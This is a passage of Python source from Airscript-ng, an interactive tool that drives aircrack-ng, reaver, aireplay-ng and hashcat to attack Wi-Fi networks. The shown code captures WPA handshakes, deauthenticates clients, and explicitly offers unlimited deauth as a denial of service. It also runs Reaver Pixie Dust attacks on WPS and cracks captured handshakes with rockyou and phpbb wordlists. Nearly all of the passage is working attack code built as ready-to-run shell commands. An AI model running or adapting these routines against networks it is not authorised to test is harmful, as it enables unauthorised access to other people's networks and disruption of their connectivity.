                            hashcatAttackMode = "Built-in wordlist"
                            mainWordList = str(mainWordList)
                            input("\nPlease locate and click inside the \033[1;33;48mHashcat-utils\033[0;39;48m directory. Remember to click inside and press ok! (press enter) \033[1;31;48m~# \033[0;39;48m")
                            hashcatUtilsPath = filedialog.askdirectory()
                            hashcatUtilsPath = str(hashcatUtilsPath)
                            while True:
                                clearTerm()
                                print("\n\033[1;33;48mPlease choose a built-in wordlist: \033[1;39;48m")
                                print("\n\033[1;32;48mType [1] \033[1;39;48m- Rockyou.txt ~15 Million lines, Skull security")
                                print("\033[1;32;48mType [2] \033[1;39;48m- Phpbb.txt, Skull security")
                                print("\033[1;32;48mType [3] \033[1;39;48m- Top 1350~ WPA/WPA2 list, from me")
                                hardcodedWordlistChoice = input("\n\033[0;39;48mEnter choice \033[1;31;48m~# \033[0;39;48m")
                                global hardcodedWordlistPath
                                if bashReturnValue("ls ~/.airscriptNG/Wordlists/ ") != '0':
                                        bashRun("mkdir ~/.airscriptNG/Wordlists/")
                                if hardcodedWordlistChoice == "1":
                                    if bashReturnValue("ls ~/.airscriptNG/Wordlists/rockyou.txt.bz2 ~/.airscriptNG/Wordlists/rockyou.txt ") != '0':
                                        bashRun("cd ~/.airscriptNG/Wordlists/ && wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2 && bzip2 -d rockyou.txt.bz2")
                                    hardcodedWordlistPath = "~/.airscriptNG/Wordlists/rockyou.txt"
                                    break
                                elif hardcodedWordlistChoice == "2":
                                    if bashReturnValue("ls ~/.airscriptNG/Wordlists/phpbb.txt.bz2 ~/.airscriptNG/Wordlists/phpbb.txt ") != '0':
                                        bashRun("cd ~/.airscriptNG/Wordlists/ && wget http://downloads.skullsecurity.org/passwords/phpbb.txt.bz2 && bzip2 -d phpbb.txt.bz2")
                                    hardcodedWordlistPath = "~/.airscriptNG/Wordlists/phpbb.txt"
                                    break
                                elif hardcodedWordlistChoice == "3":
                                    if bashReturnValue("ls ~/.airscriptNG/Dependencies-for-Airscript-ng/ ") != '0':
                                        bashRun("cd ~/.airscriptNG/ && git clone https://github.com/Sh3llcod3/Dependencies-for-Airscript-ng.git")
                                    hardcodedWordlistPath = "~/.airscriptNG/Dependencies-for-Airscript-ng/Small-wpa-list"
                                    break
                                else:
                                    continue
                            mainWordList = str(hardcodedWordlistPath)
                            while True:
                                gpuTemperatureRetain = input("What temperature do you want to retain? (degress celsius) \033[1;31;48m~# \033[0;39;48m")
                                gpuMaximumTemperature = input("What should be the cutoff/maximum temperature limit? (degress celsius) \033[1;31;48m~# \033[0;39;48m")
                                gpuTemperatureRetain = int(gpuTemperatureRetain)
                                gpuMaximumTemperature = int(gpuMaximumTemperature)
                                if gpuTemperatureRetain <= 80 and gpuMaximumTemperature <= 85:
                                    gpuTemperatureRetain = str(gpuTemperatureRetain)
                                    gpuMaximumTemperature = str(gpuMaximumTemperature)
                                    break
                                else:
                                    gpuTemperatureRetain = str(gpuTemperatureRetain)
                                    gpuMaximumTemperature = str(gpuMaximumTemperature)
                                    print("\n\033[1;31;48mTemperature value inappropriate! Please input proper and safe values.\033[0;39;48m [\033[1;32;48m<80c for retain \033[0;39;48m and \033[1;32;48m<85c for max\033[0;39;48m]")
                                    continue
                            optionDisplayMenu()
                            if input("\n\033[0;39;48mOptions correctly chosen? Start cracking? [y/n] \033[1;31;48m~# \033[0;39;48m").lower().startswith("y"):
                                if bashReturnValue("ls ~/.airscriptNG/HANDSHAKEFILE ") != '0':
                                    bashRun("touch ~/.airscriptNG/HANDSHAKEFILE")
                                bashRun("cd %s/src/ && ./cap2hccapx.bin %s ~/.airscriptNG/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 0 -m 2500 ~/.airscriptNG/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hashcatUtilsPath,captureFilePath,hashcatDirectoryPath,mainWordList,gpuTemperatureRetain,gpuMaximumTemperature,hashcatDirectoryPath))
                                bashRun("rm ~/.airscriptNG/HANDSHAKEFILE 2>/dev/null")
                                bashRun("cd ~/.airscriptNG/Dependencies-for-Airscript-ng/ && git stash && git pull >/dev/null 2>/dev/null")
                                bashRun("rm %s/hashcat.potfile %s/hashcat.log" %(hashcatDirectoryPath,hashcatDirectoryPath))
                                functions.menuOrExit()
                            optionDisplayMenu()
                        elif wordlistTypeChoice == "99":
                            mainMenu()
                        else:
                            hashcatFunction()
                hashcatFunction()
            elif chooseCpuOrGpu == "99":
                mainMenu()
            else:
                main.crackCaptureFile()
        except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError,ValueError):
            bashRun("kill $(ps aux | grep -i \"aircrack-ng\" | awk -F ' ' {'print $2'}) 2>/dev/null")
            functions.silentExit()
        #Finish here
    #This function justs reverts a backup of the bashrc file to its original location.
    #This is highly likely to be removed in the future in favour of soft links
    def functionRemoveAlias():
        print("\n[%si%s]Screwed up terminal in some unusual way?" %(col.okb,col.endl))
        def revertBashAlias():
            global revertAlias
            while True:
                clearTerm()
                revertAlias = input("\n|%sMENU%s|%sREMOVE_ALIAS%s|Remove alias? y/n >>" %(col.fail,col.endl,col.fail,col.endl))
                if revertAlias.lower().startswith("n"):
                    mainMenu()
                elif revertAlias.lower().startswith("y"):
                    if bashReturnValue("ls ~/.airscriptNG/bash_backup/bashrc-* ") == '0':
                        clearTerm()
                        print("\n")
                        bashRun("echo Bash_Aliases file found from $(ls ~/.airscriptNG/bash_backup/ | sort | awk -F '-' {'print $2'})")
                        if input("Restore? [y/n] >>").lower().startswith("y"):
                            print("\n[%s+%s]Restoring bash resource!" %(col.okg,col.endl))
                            if bashReturnValue("cp ~/.airscriptNG/bash_backup/bashrc-* ~/.bash_aliases && /bin/bash -c \"source ~/.bashrc\" && /bin/bash -c \"source ~/.bash_aliases\" ") == '0':
                                print("[%s+%s]Restored successfully!\n" %(col.okg,col.endl))
                                functions.menuOrExit()
                            else:
                                print("\n[%s-%s]Problems occured while restoring. >>" %(col.fail,col.endl))
                                functions.menuOrExit()
                        else:
                            functions.menuOrExit()
                    else:
                        def noBackupFile():
                            print("\n[%si%s]No Backup file found! Removing ~/.bash_aliases file anyway." %(col.warn,col.endl))
                            bashRun("rm ~/.bash_aliases 2>/dev/null")
                            print("[%si%s]If your terminal is borked type 'reset' " %(col.okb,col.endl))
                            print("[%si%s]Just close your terminal and re-open it. The 'airscript-ng' command should disappear.\n" %(col.okb,col.endl))
                            functions.menuOrExit()
                        noBackupFile()
        revertBashAlias()
    #This function creates an alias in the ~/.bashrc file so that the user can invoke this program from anywhere.
    #Again this will be deprecated in favour of soft-links soon.
    def createAlias():
        clearTerm()
        global scriptLocation
        if input("\033[1;37;48m\n\nAdd Airscript-ng commands to system? (append alias to ~/.bash_aliases)? %s[y/n]%s >" %(col.head_deep,col.endl)).lower().startswith("y") and bashReturnValue("cat ~/.bash_aliases 2>/dev/null | grep \"airscript-ng\" ") != '0':
            if bashReturnValue("ls .airscriptNG/bash_backup/ ") != '0':
                if bashReturnValue("mkdir -p ~/.airscriptNG/bash_backup/ ") == '0':
                    if bashReturnValue("ls ~/.bash_aliases ") == '0':
                        if bashReturnValue("ls ~/.airscriptNG/bash_backup/bashrc-* ") != '0':
                            bashRun("cp ~/.bash_aliases ~/.airscriptNG/bash_backup/bashrc-$(date | awk -F ' ' {'print $1,$2,$3,$6'} | tr -d '[:space:]' | sort) 2>/dev/null ")
            while True:
                userDirectoryChoice = input("Is this the directory where %s%s%s is saved? y/n >>" %(col.okb,sys.argv[0],col.endl))
                if userDirectoryChoice.lower().startswith('y'):
                    scriptLocation = os.path.abspath(sys.argv[0])
                    break
                elif userDirectoryChoice.lower().startswith('n'):
                    print("\033[1;34;48m\n\nPlease choose location of where you have the airscript-ng.py file. ")
                    print("\033[1;31;48mplease note though that removing the script will not remove the commands from bash, remove the alias from ~/.bashrc before doing so!")
                    input("%s\n|%sMENU%s|%sINSTALL_ALIAS%s|Press enter to continue >>%s" %(col.yel_deep,col.fail,col.yel_deep,col.fail,col.yel_deep,col.endl))
                    from tkinter.filedialog import askopenfilename, Tk as pwned
                    pwned().withdraw()
                    scriptLocation = askopenfilename()
                    break
            scriptLocation = str(scriptLocation)
            scriptInstallLocation = ("echo alias airscript-ng=\'%s\' >> ~/.bash_aliases" %(scriptLocation))
            bashRun(scriptInstallLocation)
            subprocess.call("/usr/bin/env bash -c 'source ~/.bash_aliases' ",shell=True)
            print("\n\033[1;32;48mAlias has been successfully added to ~/.bash_aliases.\033[0;39;48m")
            print("Invoke this script from anywhere by typing \"airscript-ng\" as the root user.\n")
            os._exit(0)
        elif bashReturnValue("cat ~/.bash_aliases | grep \"airscript-ng\" ") == '0':
            print("\nAlias already Exists! Quitting...")
            os._exit(0)
        else:
            mainMenu()
    #This function is to use the reaver tool, to crack wps.
    def reaver():
        try:
            clearTerm()
            print("\033[1;32;48m[+] \033[0;36;48mThanks for chosing reaver")
            print("\033[1;37;48m[-] \033[0;33;48mPlease note that Reaver-pixie dust method only works on very few WPS access points worldwide.")
            userAcknowledgement = input("\033[1;33;48m[?] %sType 'y' to continue >>%s " %(col.head,col.endl))
            if userAcknowledgement.lower().startswith('y'):
                print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
                functions.checkDependencies()
                functions.gitDeps()
                if bashReturnValue("ls -l HANDSHAKES/ ") != '0':
                    bashRun("mkdir HANDSHAKES")
                print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met. Make sure you have correct drivers! \033[0;37;48m")
                time.sleep(1)
                clearTerm()
                print("""\033[0;36;48m

    ██████╗ ██╗██╗  ██╗██╗███████╗    ██████╗ ██╗   ██╗███████╗████████╗
    ██╔══██╗██║╚██╗██╔╝██║██╔════╝    ██╔══██╗██║   ██║██╔════╝╚══██╔══╝
    ██████╔╝██║ ╚███╔╝ ██║█████╗      ██║  ██║██║   ██║███████╗   ██║   
    ██╔═══╝ ██║ ██╔██╗ ██║██╔══╝      ██║  ██║██║   ██║╚════██║   ██║   
    ██║     ██║██╔╝ ██╗██║███████╗    ██████╔╝╚██████╔╝███████║   ██║   
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   


    \033[1;33;48m[info] \033[0;32;48mDeveloped by Sh3llCod3, Using the reaver tool. 2017-2020. Use with legal caution, disclaimer applies.Thanks for using this program\n""")
                print("Ok lets put a Card in monitor mode\n")
                bashRun("sudo systemctl stop NetworkManager.service")
                bashRun("sudo systemctl stop wpa_supplicant.service")
                print("\033[1;32;48m[+] \033[0;37;48myour cards are:\n ")
                index = functions.getAvailableWifiCards()
                print("\n[%si%s] %sOk, seems like %s is in monitor mode." %(col.okb,col.endl,col.endl_deep,index))
                print("[%si%s] %sNow we'll run wash to find all the wps networks around%s" %(col.okb,col.endl,col.blue_deep,col.endl))
                print("[%si%s] %sPlease press CTRL+C once you see your target network%s" %(col.okb,col.endl,col.yel_deep,col.endl))
                input("\n[%si%s] Got all that? Press enter (%srun for 3~ secs minimum%s) >> "%(col.okb,col.endl,col.green_deep,col.endl))
                tempPath = ioStream('mktemp HANDSHAKES/TEMP_DUMP_XXXX')
                dumpPath = ioStream('mktemp HANDSHAKES/TEMP_DUMP_XXXX')
                try:
                    bashRun("/usr/bin/env bash -c 'nohup ~/.airscriptNG/air/*/src/airodump-ng -a --wps -w %s --output-format csv -I 3 -t WPA -t WPA2 -t WPA1 --ignore-negative-one %s &>/dev/null &'" %(tempPath,index))
                    bashRun("~/.airscriptNG/wps/*/src/wash -i %s | tee -a %s" %(index,dumpPath))
                except(KeyboardInterrupt,EOFError):
                    bashRun('killall airodump-ng')
                    bashRun("/usr/bin/env bash -c 'killall wash && disown 2>/dev/null'")
                #This part is far to obfuscated to cleanup, so to avoid breaking this, i'm going to leave variable names as is.
                #It was copy/pasted from an older version. So this is all older code, however it is functional.
                #If you were planning on modifying/reading this part of code, I'm sorry, there isn't much I can do with this existing code.
                #However I will re-write this at some point. Assuming exams ever end. Which is debatable.
                csvFileArray = []
                airodumpCsvFile = None
                csv_overlap = ioStream('cat %s' %(dumpPath)).split()
                def getCsvFile():
                    try:
                        x = ioStream('ls HANDSHAKES/*csv | wc -l')
                        print('\n\n')
                        for _ in range(1,int(x)+1):
                            csvFileArray.append(ioStream('ls HANDSHAKES/*csv | head -n %s | tail -n 1' %(_)))
                        global csvFileFromAirodump
                        csvFileFromAirodump = ('%s-01.csv'  %(tempPath))
                        clearTerm()
                        with open(csvFileFromAirodump,newline='') as csvfile:
                            reader = csv.reader(csvfile,delimiter=',')
                            counter_for_csv = 0
                            global value_for_csvFileArray
                            value_for_csvFileArray = []
                            vsf = value_for_csvFileArray
                            for row in reader:
                                if row != [] and len(row) >= 13:
                                    if counter_for_csv == 0:
                                        counter_for_csv += 1
                                    else:
                                        if row[0].strip() in csv_overlap:
                                            value_for_csvFileArray.append([row[0].strip(),row[3].strip(),row[5].strip(),row[6].strip(),row[7].strip(),row[8].strip(),row[13].strip()])
                                            counter_for_csv += 1
                            another_counter = 1
                            print('%sViewing all networks:%s\n' %(col.endl_deep,col.endl))
                            print(""" %sNO.%s  %sBSSID%s              %sPWR%s  %sCH%s  %sSECURITY%s %sCIPHER%s %sAUTH%s %sESSID%s\n"""
                                %(col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl))
                            for _ in vsf:
                                for xy in range(1,len(_)):
                                    if _[xy] == '' or _[xy].lower().startswith('\x00'):
                                        _[xy] = 'N/A'
                                    if len(_[xy].split()) > 1:
                                        _[xy] = _[xy].split()
                                        _[xy] = _[xy][0]
                                if len(_[1]) == 1:
                                    _[1] = ' ' + _[1]
                                if int(another_counter) <= 9:
                                    another_counter = str(another_counter)
                                    another_counter = another_counter + ' '
                                if _[0] in csv_overlap:
                                    print(""" %s#%s:%s %s  %s   %s   %s    %s  %s  %s  """
                                    %(col.fail,col.endl,another_counter,_[0],_[5],_[1],_[2],_[3],_[4],_[6]))
                                    another_counter = int(another_counter)
                                    another_counter += 1
                        del csvFileArray[:]
                        bashRun('rm %s' %(tempPath))
                    except(TypeError,ValueError):
                        del csvFileArray[:]
                        getCsvFile()
                getCsvFile()
                while True:
                    network_select_csv = input('\nPlease enter no.(#) of the network you want $')
                    try:
                        network_select_csv = int(network_select_csv)
                    except(TypeError,ValueError):
                        continue
                    finally:
                        if network_select_csv in range(1,len(value_for_csvFileArray)+1):
                            break     
                b = ioStream('mktemp HANDSHAKES/CAPTURE_FILE_XXXX')
                c = value_for_csvFileArray[network_select_csv-1][1]
                d = value_for_csvFileArray[network_select_csv-1][0]
                k = value_for_csvFileArray[network_select_csv-1][-1]
                bashRun('rm %s 2>/dev/null' %(csvFileFromAirodump))
                bashRun('rm %s 2>/dev/null' %(tempPath))
                bashRun('rm %s 2>/dev/null' %(dumpPath))
                clearTerm()
                print("\033[1;32;48m[+]\033[1;39;48mSELECTED NETWORK: %s%s%s" %(col.fail_deep,k,col.endl_deep))
                print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s-01.cap" %(b))
                bashRun('rm %s' %(b))
                print("[\033[1;32;48mCHANNEL\033[1;39;48m]: %s" %(c))
                print("[\033[1;32;48mBSSID (AP MAC)\033[1;39;48m]: %s" %(d))
                print("[\033[1;32;48mESSID (AP SSID)\033[1;39;48m]: %s" %(k))
                print("[\033[1;32;48mCIPHER\033[1;39;48m]: %s" %(value_for_csvFileArray[network_select_csv-1][-4]))
                print("[\033[1;32;48mSIGNAL STRENGTH\033[1;39;48m]: %s dBm" %(value_for_csvFileArray[network_select_csv-1][-2]))
                print("[\033[1;32;48mAUTHENTICATION\033[1;39;48m]: %s" %(value_for_csvFileArray[network_select_csv-1][-3]))
                #stop it. get some help. fix your code. don't write code like this. save yourself from Code-Trauma, ignore lines 1070 to this.
                b = str(d) #These were my old variable names. I don't even know how I can ever fix this.
                c = str(c) #Find and replace shows me 2000+ instances of 'c', so a complete re-write of this function is in the pipeline.
                print('\n')
                def fix():
                    print("\033[1;34;48m[info] \033[1;37;48mOnce you hit enter i'll attempt to pwn the wps using Reaver + Pixie dust.")
                    print("\033[1;34;48m[info] \033[1;33;48mPlease note that this can backfire and lock the AP if left for too long")
                    print("\033[1;34;48m[info] \033[1;35;48mIt should work in 15secs~30secs. If you see it running for more, then cancel it with CTRL+C.Don't risk it.Try again.")
                    print("\033[1;34;48m\nHow do you want to run it? \033[1;32;48m[1] \033[1;34;48mto run normally or \033[1;32;48m[2] \033[1;34;48mto fix \033[1;31;48m'FAILED TO ASSOCIATE WITH AP'\033[0;34;48m %s(RECOMMENDED METHOD)%s" %(col.okg,col.endl))
                    opt = input("\n\033[0;33;48mChoose either 1 or 2 >>")
                    if opt == "1":
                        bashRun("~/.airscriptNG/wps/*/src/reaver -i %s -b %s -K 1 -vvv -c %s" %(index,b,c))
                        print("\033[1;34;48m\n[info] \033[1;35;48mBy now it has either worked or not. If it hasn't, well then i'm sorry. Please use the fix/aircrack-ng approach instead or if it has then CONGRATS ON FINDING THE PSK!")        
                        functions.cleanupScript(index)
                    if opt == "2":
                        bashRun("xterm $HOLD -title 'ASSOCIATING WITH AP'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -geometry +2160 -e ~/.airscriptNG/air/*/src/aireplay-ng -1 30 -a %s %s & ~/.airscriptNG/wps/*/src/reaver -i %s -b %s -K 1 -vvv -c %s -N -A " %(b,index,index,b,c))
                        print("\033[1;34;48m\n[info] \033[1;35;48mBy now it has either worked or not. If not then please try option [1]")
                        bashRun("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
                        functions.cleanupScript(index)
                    else:
                        clearTerm()
                        fix()
                fix()
            else:
                clearTerm()
                reaver()
        except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
            functions.silentCleanupScript(None)
            try:
                functions.cleanupScript(index)
            except(UnboundLocalError):
                print('\n')
                functions.menuOrExit()
    #This is the function which will handle Aircrack-ng, for most users this will be the go-to choice.
    def aircrackng():
        print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
        functions.checkDependencies()
        functions.gitDeps()
        print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met. Make sure you have correct drivers! \033[0;37;48m")
        time.sleep(1)		
        clearTerm()
        while True:
            try:
                def aircrackMenu():
                    print ("""
        \n\033[1;37;48m

     █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗     ███╗   ██╗ ██████╗ 
    ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝     ████╗  ██║██╔════╝ 
    ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝█████╗██╔██╗ ██║██║  ███╗
    ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗╚════╝██║╚██╗██║██║   ██║
    ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗     ██║ ╚████║╚██████╔╝
    ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═╝  ╚═══╝ ╚═════╝ 


    \033[1;33;48m[info] \033[1;32;48mDeveloped by Sh3llCod3, Using the Aircrack-ng tool. 2017-2020. Use with legal caution, disclaimer applies.\033[1;39;48m                                                                                  
        """)
                    if bashReturnValue("ls -l HANDSHAKES/ ") != '0':
                        bashRun("mkdir HANDSHAKES")
                    temp_path = ioStream('mktemp HANDSHAKES/TEMP_DUMP_XXXX')
                    print("\nHi, Please read everything that appears at the bottom")
                    print("Thanks for using this program")
                    bashRun("sudo systemctl stop NetworkManager.service")
                    bashRun("sudo systemctl stop wpa_supplicant.service")
                    print("\n\033[1;32;48m[+] \033[1;32;48myour cards are: \033[0;39;48m\n")
                    index = functions.getAvailableWifiCards()
                    print("\n\033[1;34;48m[info] \033[1;37;48m1) Ok, seems like %s is in monitor mode" %(index))
                    print("\033[1;34;48m[info] \033[1;34;48m2) Now, we'll run Airodump-ng to capture the handshake")
                    input("\033[1;34;48m[info] \033[1;33;48m3) Run it for %s5~ seconds%s and press \033[1;32;48mCTRL+C\033[1;33;48m when you see target network. \n\n\033[1;33;48m[?] press enter to continue >>" %(col.green_deep,col.yel_deep))
                    getCurrentTime = time.time()
                    try:
                        bashRun("~/.airscriptNG/air/*/src/airodump-ng -a -w %s --output-format csv -I 3 -t WPA -t WPA2 -t WPA1 --ignore-negative-one %s" %(temp_path,index))
                    except(KeyboardInterrupt,EOFError):
                        if round(time.time()-getCurrentTime) < 3:
                            functions.silentCleanupScript(index)
                            print("[%s-%s] Not enough time has elasped to gather sufficient data. Please try again." %(col.fail,col.endl))
                            functions.menuOrExit()
                        elif round(time.time()-getCurrentTime) >= 3:
                            pass
                    csv_array = []
                    csv_file = None
                    #This function will be re-written when I have the time. For now, it will be a copy/paste of old code.
                    def getCsv():
                        try:
                            x = ioStream('ls HANDSHAKES/*csv | wc -l')
                            print('\n\n')
                            for _ in range(1,int(x)+1):
                                csv_array.append(ioStream('ls HANDSHAKES/*csv | head -n %s | tail -n 1' %(_)))
                            global csv_file_choice
                            csv_file_choice = ('%s-01.csv'  %(temp_path))
                            clearTerm()
                            with open(csv_file_choice,newline='') as csvfile:
                                reader = csv.reader(csvfile,delimiter=',')
                                counter_for_csv = 0
                                global value_for_csv_array
                                value_for_csv_array = []
                                vsf = value_for_csv_array
                                for row in reader:
                                    if row != [] and len(row) >= 13:
                                        if counter_for_csv == 0:
                                            counter_for_csv += 1
                                        else:
                                            value_for_csv_array.append([row[0].strip(),row[3].strip(),row[5].strip(),row[6].strip(),row[7].strip(),row[8].strip(),row[13].strip()])
                                            counter_for_csv += 1
                                another_counter = 1
                                print('%sViewing all networks:%s\n' %(col.endl_deep,col.endl))
                                print(""" %sNO.%s  %sBSSID%s              %sPWR%s  %sCH%s  %sSECURITY%s %sCIPHER%s %sAUTH%s %sESSID%s\n"""
                                    %(col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl))
                                for _ in vsf:
                                    for xy in range(1,len(_)):
                                        if _[xy] == '' or _[xy].lower().startswith('\x00'):
                                            _[xy] = 'N/A'
                                        if len(_[xy].split()) > 1:
                                            _[xy] = _[xy].split()
                                            _[xy] = _[xy][0]
                                    if len(_[1]) == 1:
                                        _[1] = ' ' + _[1]
                                    if another_counter <= 9:
                                        another_counter = str(another_counter)
                                        another_counter = another_counter + ' '
                                    print(""" %s#%s:%s %s  %s   %s   %s    %s  %s  %s  """
                                    %(col.fail,col.endl,another_counter,_[0],_[5],_[1],_[2],_[3],_[4],_[6]))
                                    another_counter = int(another_counter)
                                    another_counter += 1
                            del csv_array[:]
                            bashRun('rm %s' %(temp_path))
                        except(TypeError,ValueError):
                            del csv_array[:]
                            getCsv()
                    getCsv()
                    while True:
                        network_select_csv = input('\nPlease enter no(#) of the network you want $')
                        try:
                            network_select_csv = int(network_select_csv)
                        except(TypeError,ValueError):
                            continue
                        finally:
                            if network_select_csv in range(1,len(value_for_csv_array)+1):
                                break     
                    b = ioStream('mktemp HANDSHAKES/CAPTURE_FILE_XXXX')
                    c = value_for_csv_array[network_select_csv-1][1]
                    d = value_for_csv_array[network_select_csv-1][0]
                    k = value_for_csv_array[network_select_csv-1][-1]
                    bashRun('rm %s 2>/dev/null' %(csv_file_choice))
                    bashRun('rm %s 2>/dev/null' %(temp_path))
                    b = str(b)
                    bashRun('rm %s 2>/dev/null' %(b))
                    c = str(c)
                    d = str(d)
                    if b and c and d != "":
                        clearTerm()
                        print("\033[1;32;48m[+]\033[1;39;48mSELECTED NETWORK: %s%s%s" %(col.fail_deep,k,col.endl_deep))
                        print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s-01.cap" %(b))
                        print("[\033[1;32;48mCHANNEL\033[1;39;48m]: %s" %(c))
                        print("[\033[1;32;48mBSSID (AP MAC)\033[1;39;48m]: %s" %(d))
                        print("[\033[1;32;48mESSID (AP SSID)\033[1;39;48m]: %s" %(k))
                        print("[\033[1;32;48mCIPHER\033[1;39;48m]: %s" %(value_for_csv_array[network_select_csv-1][-4]))
                        print("[\033[1;32;48mSIGNAL STRENGTH\033[1;39;48m]: %s dBm" %(value_for_csv_array[network_select_csv-1][-2]))
                        print("[\033[1;32;48mAUTHENTICATION\033[1;39;48m]: %s" %(value_for_csv_array[network_select_csv-1][-3]))
                        print("\n\033[1;32;48m[info] \033[1;34;48mWe need to de-auth someone. We don't have to, you can wait for someone to connect.")
                        e = input("\n\033[1;35;48m[?] \033[1;39;48mDe-auth all \033[1;32;48m[type a]\033[1;39;48m, de-auth client \033[1;32;48m[type c]\033[1;39;48m, don't de-auth \033[1;32;48m[type n]\033[0;39;48m \033[1;31;48m ~# \033[0;39;48m")
                        e = str(e)
                        def crackCapturedHandshake():
                            print("\n\n\033[1;34;48m[info] \033[1;32;48mIf you saw [WPA HANDSHAKE: %s] at the top right, then its time to crack the handshake." %(d))
                            while True:
                                print("\033[1;33;48m[info] \033[1;39;48m%sIf you use GPU remember the handshake will be in a folder called%s%s \"HANDSHAKES\" %s" %(col.fail,col.endl,col.blue_deep,col.endl))
                                choice_of_cpu_gpu = input("%sCrack using%s: CPU-->[c] (all CPUs)| GPU-->[g] (GTX 9xx,10xx+/AMD ROCM GPU) %s$%s " %(col.blue_deep,col.endl,col.okg,col.endl))
                                if choice_of_cpu_gpu.lower().startswith("c"):
                                    functions.silentCleanupScript(index)
                                    break
                                elif choice_of_cpu_gpu.lower().startswith("g"):
                                    functions.silentCleanupScript(index)
                                    main.crackCaptureFile()
                            print("\033[1;32;48m[info]%sWe need a wordlist. You can download one from here: %shttps://goo.gl/3UoZ34 %s" %(col.endl,col.blue_deep,col.endl))
                            input("\n\033[1;32;48m[+] \033[1;31;48mPlease Specify wordlist. Press \033[1;32;48m[enter]\033[1;31;48m to open file selection \033[1;31;48m ~# \033[0;39;48m")
                            def wordlist():
                                from tkinter.filedialog import Tk
                                from tkinter.filedialog import askopenfilename
                                Tk().withdraw()
                                global f
                                f = askopenfilename()
                                f = str(f)
                            wordlist()
                            clearTerm()
                            print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s-01.cap" %(b))
                            print("[\033[1;32;48mWORDLIST\033[1;39;48m]: %s" %(f))
                            print('\n[%s+%s] Ready to start cracking. Press enter to continue, or ctrl+c to cancel.' %(col.okg,col.endl))
                            print('[%s+%s] Addtionally, pressing ctrl+c will cancel it anytime.\n' %(col.okg,col.endl))
                            input("\033[1;33;48mPress \033[1;32;48m[enter]/[CTRL+C]\033[1;31;48m ~# \033[0;39;48m")
                            try:
                                bashRun("~/.airscriptNG/air/*/src/aircrack-ng %s-01.cap -w %s" %(b,f))
                                functions.cleanupScript(index)
                            except(KeyboardInterrupt,EOFError):
                                print("%s\n^Recieved KeyboardInterrupt/EOF. Cancelling...%s" %(col.fail_deep,col.endl))
                                bashRun('killall aircrack-ng 2>/dev/null')
                            print("\n\n\033[1;32;48m[+] \033[0;37;48mIf you see 'KEY FOUND:XXXXXXX', that's the PSK.")
                            print("\033[1;32;48m[+] \033[0;37;48mIf the passphrase was not in the dictonary then try option [4] using hashcat.\n")
                            functions.cleanupScript(index)
                        def standard():
                            clearTerm()
                            global stda 
                            print("\033[1;32;48m[info] \033[1;39;48mHow many de-auths do you want to send to the client: %s? Typing '0' will de-auth indefinitely, creating a denial of service." %(g))
                            stda = input("\n\033[1;39;48mPlease enter a number. Around 3-5 is sufficient for a good WiFi-card.\033[1;31;48m ~# \033[0;39;48m")
                            input("\n\033[1;33;48m[?] \033[1;37;48mONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT, CLOSE THE WHITE WINDOW. \n\n[PRESS ENTER] \033[1;31;48m ~# \033[0;39;48m" %(d))
                            bashRun("iwconfig %s channel %s" %(index,c))
                            bashRun("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING: %s & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e '~/.airscriptNG/air/*/src/aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one && ~/.airscriptNG/air/*/src/airodump-ng --output-format pcap -w %s -c %s --bssid %s --ignore-negative-one %s'" %(g,stda,d,g,index,b,c,d,index))
                            crackCapturedHandshake()
                        def broadcast_deauth():
                            clearTerm()
                            global brda 
                            print("\033[1;32;48m[info] \033[1;39;48mHow many de-auths do you want to send to all? Typing '0' will de-auth indefinitely, creating a denial of service.")
                            brda = input("\n\033[1;39;48mPlease enter a number. Around 3-5 is sufficient for a good WiFi-card.\033[1;31;48m ~# \033[0;39;48m")
                            input("\n\033[1;33;48m[?] \033[1;39;48mONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT, CLOSE THE WHITE WINDOW. \n\n[PRESS ENTER] \033[1;31;48m ~# \033[0;39;48m" %(d))
                            bashRun("iwconfig %s channel %s" %(index,c))
